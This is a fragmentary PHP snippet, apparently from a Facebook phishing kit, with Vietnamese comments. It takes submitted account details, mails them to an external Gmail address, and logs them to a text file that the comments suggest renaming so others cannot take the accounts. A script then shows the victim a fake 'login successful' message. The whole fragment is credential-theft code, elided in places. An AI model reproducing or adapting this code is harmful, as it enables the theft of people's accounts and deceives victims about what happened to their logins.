...
date_default_timezone_set('Asia/Ho_Chi_Minh');
 $huongdz['num'] = 0;
	...
	if($huongdz['num'] == 155){ //đăt số lần đăng nhập cho phép
 ...
 $time = date('H:i:s d/m/Y');
    ...
    $type = $_POST["type"];
     ...
     $headers = "Tài khoản facebook";
      ...
      mail("ngocnguyenn898@gmail.com", $headers, $body); // muốn gửi về mail thì bỏ 2 dấu // phía trước đi rồi thay mail
    $test = fopen("nnn.txt","a");//đổi tên file hu.txt này để tránh trường hợp người khác vào lấy acc
    fwrite($test,$body);
    fclose($test);
    	$huongdz['num']++;
...
<script>
 let icon ='success'; //icon thất bại đổi error thành success đề thành công
 let title ='Đăng nhập thành công'; // tiêu đề
 let text ='Thông tin đăng nhập chính xác!'; //content
